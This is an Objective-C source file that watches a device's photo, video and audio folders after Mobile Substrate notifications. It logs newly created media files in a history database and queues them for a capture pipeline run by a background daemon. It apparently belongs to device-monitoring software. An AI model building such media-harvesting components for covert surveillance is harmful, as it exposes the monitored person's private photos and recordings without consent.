//
//  MediaOP.m
//  MediaCaptureManager
//
//  Created by Makara Khloth on 2/28/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MediaOP.h"
#import "MediaCaptureManager.h"
#import "AudioCapture.h"
#import "VideoCapture.h"
#import "PhotoCapture.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"
#import "MediaHistory.h"
#import "MediaHistoryDatabase.h"
#import "FxDatabase.h"
#import "DebugStatus.h"
#import "MediaCaptureNotifier.h"

@interface MediaOP (private)

- (NSString *) capturedMediaPathWithType: (NSString *)aType;
- (NSArray *) mediaContents: (NSString *) aType 
			   andMediaPath: (NSString *) aPath;
- (NSArray *) directoryContents: (NSString *) aPath;
- (NSString *) checkDuplicateFile: (NSString *) aMediaType filePath: (NSString *) aFilePath;
- (NSString *) completeFilePath: (NSString *) aFileName;
- (void) operationCompleted: (id) aMe;
- (BOOL) checkDuplicationAndAddMediaPathToDB: (NSString *) aMediaFilePath;

@end

@implementation MediaOP

@synthesize mMediaDirectory;
@synthesize mMediaType;
@synthesize mMyThread;
@synthesize mMediaFilePath;
@synthesize mMediaCaptureManager;
@synthesize mNotification;

- (id) initWithMediaCaptureManager: (MediaCaptureManager *) aMediaCaptureManager {
	if ((self = [super init])) {
		mMediaCaptureManager = aMediaCaptureManager;
		[self setMMyThread:[NSThread currentThread]];
	}
	return (self);
}


- (void) main {
	NSString *mediaFilePath = [NSString string];
	NSInteger length = 0;
	NSInteger iteration = 0;
	
	// For 1 Notification, search the directory 4 times
	do {
		iteration ++;
		mediaFilePath = [self capturedMediaPathWithType:[self mMediaType]];
		length = [mediaFilePath length];
		if (length <= 0) { // Wait cannot get file yet or this OP is extra notification from Mobile Substrate
			[NSThread sleepForTimeInterval:5];
		} else { // found a media file
			if ([self checkDuplicationAndAddMediaPathToDB:mediaFilePath]) 
				 length = 0;
		}
	} while (length <= 0 && iteration <= 3);
	
	DLog(@"!!!!!!!!!!!!!!!!! Done SEARCHIING and get %@ for notification %@", mediaFilePath, [self mNotification])
	DLog(@"!!!!!!!!!!!!!!!!! id: %@", [[self mNotification] objectForKey:NOTIFICATION_ID_KEY]);
	DLog(@"!!!!!!!!!!!!!!!!! TS: %@", [[self mNotification] objectForKey:INTERVAL_TIMESTAMP_KEY]);
	DLog(@"!!!!!!!!!!!!!!!!! TS: %@", [[self mNotification] objectForKey:FORMATTED_TIMESTAMP_KEY]);
	
	[self setMMediaFilePath:mediaFilePath];
	[self performSelector:@selector(operationCompleted:) onThread:[self mMyThread] withObject:self waitUntilDone:NO];
	[NSThread sleepForTimeInterval:1.5];
}

- (BOOL) checkDuplicationAndAddMediaPathToDB: (NSString *) aMediaFilePath {
	FxDatabase *fxDB = [[mMediaCaptureManager mMediaHistoryDB] mDatabase];
	FMDatabase *fmDB = [fxDB mDatabase];
	MediaHistory *mediaHistory =  [[MediaHistory alloc] initWithDatabase:fmDB];
	
	DLog(@"count before insert: %d", [mediaHistory countMediaHistory]);
	
	BOOL mediaExist = FALSE;
	
	// check duplication on the database
	if ([mediaHistory checkDuplication:aMediaFilePath]) {
		DLog(@"!!!!!!!!!!!!!!!!!! MEDIA '%@' EXIST !!!!!!!!!!!!!\n", aMediaFilePath)
		mediaExist = TRUE;
	} else {
		[mediaHistory addMedia:aMediaFilePath];
	}
	DLog(@"count after insert: %d", [mediaHistory countMediaHistory]);
	[mediaHistory release];
	return mediaExist;
}

/**
 - Method name: capturedMediaPathWithType
 - Purpose:This method is used to get the Media Path
 - Argument list and description:aType (NSString)
 - Return description:No Return
 */

- (NSString *) capturedMediaPathWithType: (NSString *)aType  {
	NSString *mediaFilePath = [NSString string];
	NSArray *directoryContents = [self mediaContents:aType andMediaPath:[self mMediaDirectory]];
	for (NSString *path in directoryContents) {
		path = [self checkDuplicateFile:aType filePath:path];
		if ([path length]) {
			mediaFilePath = [NSString stringWithString:path];
			break;
		}
	}
    return mediaFilePath;
}

/**
 - Method name: mediaContents:andMediaPath
 - Purpose:This method is used to filter media contents in file system
 - Argument list and description:aType (NSString),aPath (NSString *)
 - Return description:No Return
 */

- (NSArray *) mediaContents: (NSString *)aType
			   andMediaPath: (NSString *)aPath {
	NSArray* extensions=nil;
	if([aType isEqualToString:kMediaTypePhoto]) { 
		extensions=[NSArray arrayWithObjects: @"jpg", @"jpeg", nil];
	} else if ([aType isEqualToString:kMediaTypeVideo]) {
		extensions = [NSArray arrayWithObjects:@"mov", nil];
	} else { // Audio
		extensions=[NSArray arrayWithObjects:@"m4a", nil];	
	}
	
	NSMutableArray *subpredicates = [NSMutableArray array];
	for (NSString *extension in extensions) {
		[subpredicates addObject:[NSPredicate predicateWithFormat:@"SELF ENDSWITH %@", [extension uppercaseString]]];
		[subpredicates addObject:[NSPredicate predicateWithFormat:@"SELF ENDSWITH %@", [extension lowercaseString]]];
	}
	NSArray* directoryContents = [self directoryContents:aPath];
	NSPredicate *filter = [NSCompoundPredicate orPredicateWithSubpredicates:subpredicates];
	NSArray *array = [directoryContents filteredArrayUsingPredicate:filter];
	if ([array count] > 50) {
		array = [array subarrayWithRange:NSMakeRange([array count] - 50, 50)];
	}
	return (array);
}

- (NSArray *) directoryContents: (NSString *) aPath {
	NSMutableArray *direcotryContents = [NSMutableArray array];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSError *error = nil;
	NSArray *subFolderList = [fileManager contentsOfDirectoryAtPath:aPath error:&error];
	if (!error) {
		for (NSString *subFolder in subFolderList) {
			BOOL isFolder = FALSE;
			NSString *subFolderPath = [NSString stringWithFormat:@"%@%@", aPath, subFolder];
			[fileManager fileExistsAtPath:subFolderPath isDirectory:&isFolder];
			if (isFolder) { // For image and video
				error = nil;
				NSArray *contents = [fileManager contentsOfDirectoryAtPath:subFolderPath error:&error];
				if (!error) {
					for (NSString *file in contents) {
						NSString *mediaFile = [NSString stringWithFormat:@"%@/%@", subFolderPath, file];
						[direcotryContents addObject:mediaFile];
					}
				}
			} else { // Audio
				NSString *mediaFile = [NSString stringWithString:subFolderPath];
				[direcotryContents addObject:mediaFile];
			}

		}
	}
	return (direcotryContents);
}

/**
 - Method name: checkDuplicateFile
 - Purpose: This method check whether media type which just created could be duplicate with previous media files (in case user delete the file)  
 - Argument list and description: aMediaType
 - Return description: path (NSString)
 */

- (NSString *) checkDuplicateFile: (NSString *) aMediaType filePath: (NSString *) aFilePath {
	DLog(@"aFilePath = %@", aFilePath)
	NSString *mediaFile = [NSString stringWithString:aFilePath];
	NSFileManager *fm = [NSFileManager defaultManager];
	NSDictionary *attr = [fm attributesOfItemAtPath:mediaFile error:nil];
	NSTimeInterval ts = [[attr fileCreationDate] timeIntervalSince1970];
	NSTimeInterval lastTS = 0.0;
	if ([aMediaType isEqualToString:kMediaTypePhoto]) {
		NSData *tsd = [NSData dataWithContentsOfFile:[self completeFilePath:kFileCameraImageTimeStamp]];
		if ([tsd length]) {
			[tsd getBytes:&lastTS length:sizeof(NSTimeInterval)];
			if (ts <= lastTS) {
				mediaFile = [NSString string];
			} else {
				[[NSData dataWithBytes:&ts length:sizeof(NSTimeInterval)] writeToFile:[self completeFilePath:kFileCameraImageTimeStamp] atomically:YES];
			}
		}
	} else if ([aMediaType isEqualToString:kMediaTypeVideo]) {
		NSData *tsd = [NSData dataWithContentsOfFile:[self completeFilePath:kFileVideoTimeStamp]];
		if ([tsd length]) {
			[tsd getBytes:&lastTS length:sizeof(NSTimeInterval)];
			if (ts <= lastTS) {
				mediaFile = [NSString string];
			} else {
				[[NSData dataWithBytes:&ts length:sizeof(NSTimeInterval)] writeToFile:[self completeFilePath:kFileVideoTimeStamp] atomically:YES];
			}
		}
	} else {
		NSData *tsd = [NSData dataWithContentsOfFile:[self completeFilePath:kFileAudioTimeStamp]];
		if ([tsd length]) {
			[tsd getBytes:&lastTS length:sizeof(NSTimeInterval)];
			if (ts <= lastTS) {
				mediaFile = [NSString string];
			} else {
				[[NSData dataWithBytes:&ts length:sizeof(NSTimeInterval)] writeToFile:[self completeFilePath:kFileAudioTimeStamp] atomically:YES];
			}
		}
	}
	// For logging purpose: get timestamp of now
//	NSDate *date = [NSDate date];
//	NSTimeInterval now = [date timeIntervalSince1970];
	
//	NSDateFormatter *dateFormatter = [[[NSDateFormatter alloc] init] autorelease];
//	[dateFormatter setDateFormat:@"HH:mm:ss:SSSS"];	
//	NSString *formattedDateString = [dateFormatter stringFromDate:date];
//	DLog (@"!!!!!! time !!!!!! %@", formattedDateString);
	
//	DLog(@"ts = %f, lastTS = %f, now = %f, diff = %f", ts, lastTS, now, lastTS - ts);
	DLog(@"mediaFile = %@", mediaFile)
	return (mediaFile);
}

- (NSString *) completeFilePath: (NSString *) aFileName {
	NSString * path = [[DaemonPrivateHome daemonSharedHome] stringByAppendingString:aFileName];
	return (path);
}

- (void) operationCompleted: (id) aMe {
	MediaOP *me = aMe;
	NSString *mediaFilePath = [me mMediaFilePath];
	NSString *tsFile = [NSString string];
	
	DLog(@"!!!!!!!!!!!!!!!!! OPERATION COMPLETED for media %@ for notification %@", mediaFilePath, [self mNotification])
	DLog(@"!!!!!!!!!!!!!!!!! id: %@", [[self mNotification] objectForKey:NOTIFICATION_ID_KEY]);
	DLog(@"!!!!!!!!!!!!!!!!! TS: %@", [[self mNotification] objectForKey:INTERVAL_TIMESTAMP_KEY]);
	DLog(@"!!!!!!!!!!!!!!!!! TS: %@", [[self mNotification] objectForKey:FORMATTED_TIMESTAMP_KEY]);
	
	if ([[me mMediaType] isEqualToString:kMediaTypeAudio]) {
		if ([mediaFilePath length]) { // Find audio file not found
			[[[me mMediaCaptureManager] mAudioCapture] addPathToAudioQueue:mediaFilePath];
			[[[me mMediaCaptureManager] mAudioCapture] processAudioCaptureQueue];
		}
		tsFile = [NSString stringWithString:kFileAudioTimeStamp];
	} else if ([[me mMediaType] isEqualToString:kMediaTypeVideo]) {
		if ([mediaFilePath length]) { // Find video file not found
			[[[me mMediaCaptureManager] mVideoCapture] addPathToVideoQueue:mediaFilePath];
			[[[me mMediaCaptureManager] mVideoCapture] processVideoCaptureQueue];
		}
		tsFile = [NSString stringWithString:kFileVideoTimeStamp];
	} else if ([[me mMediaType] isEqualToString:kMediaTypePhoto]) { // Find photo file not found
		if ([mediaFilePath length]) {
			[[[me mMediaCaptureManager] mPhotoCapture] addPathToPhotoQueue:mediaFilePath];
			[[[me mMediaCaptureManager] mPhotoCapture] processPhotoCaptureQueue];
		}
		tsFile = [NSString stringWithString:kFileCameraImageTimeStamp];
	}
	
	// *** To maintain time stamp for media in case some notifications missed to get media files
//	BOOL sameTimerTypeMore = FALSE;
	BOOL sameOPTypeMore = FALSE;
//	for (NSTimer *timer in [[me mMediaCaptureManager] mTimers]) { // Whether there exist timers of the same media type are waiting to fire
//		MediaOP *op = [timer userInfo];
//		if ([[op mMediaType] isEqualToString:[me mMediaType]]) {
//			sameTimerTypeMore = TRUE;
//			break;
//		}
//	}
//	
	for (MediaOP * op in [[[me mMediaCaptureManager] mMediaOPQueue] operations]) { // Whether there exist OPs of the same media type are waitiong to execute
		if ([[op mMediaType] isEqualToString:[me mMediaType]] && op != me) {
			sameOPTypeMore = TRUE;
			break;
			}
		}
//	
//	if (!sameTimerTypeMore && !sameOPTypeMore) { // No more timers & OPs with the same media type, thus reset the time stamp to now
//		if ([tsFile length]) [[me mMediaCaptureManager] resetTS:tsFile];
//	}
	
	DLog(@"!!!!!!!!!!!!!!!!!!!!! OP-notfCount = %d, sameOPTypeMore = %d, Capturing = %d !!!!!!!!!!!!!!!!!!!!!", 
		[[me mMediaCaptureManager] mMediaNotificationCount], 
		sameOPTypeMore, 
		[[me mMediaCaptureManager] mMediaIsCapturing])
	
	if (!sameOPTypeMore &&												// no more same type of OP
		([[me mMediaCaptureManager] mMediaNotificationCount] <= 0) &&		// notificaiton count is 0
		([[me mMediaCaptureManager] mMediaIsCapturing] == FALSE)) {		// no recording at this time
		if ([tsFile length]) [[me mMediaCaptureManager] resetTS:tsFile];
	}
}

- (void) dealloc {
	[mMediaFilePath release];
	[mMediaDirectory release];
	[mMediaType release];
	[mMyThread release];
	[self setMNotification:nil];
	[super dealloc];
}

@end
